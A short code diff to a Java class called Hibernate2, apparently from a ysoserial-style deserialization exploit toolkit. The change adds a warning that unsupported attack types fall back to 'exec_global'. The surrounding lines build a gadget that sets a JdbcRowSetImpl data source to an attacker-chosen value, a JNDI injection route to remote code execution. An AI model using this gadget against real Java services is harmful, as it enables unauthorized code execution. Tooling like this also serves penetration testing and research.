@@ -52,6 +52,16 @@ public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies {
     }
 
     public Object getObject ( String command, String attackType) throws Exception {
+    	
+		if(!attackType.equals("exec_global")) {
+	    	
+	    	System.err.println("**********************************");
+	    	System.err.println(attackType + " not supported. Defaulting to exec_global");
+	    	System.err.println("**********************************");
+	    	System.err.println();
+	    	
+	    }    	
+    	
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(command);
         return Hibernate1.makeCaller(rs,Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData") );
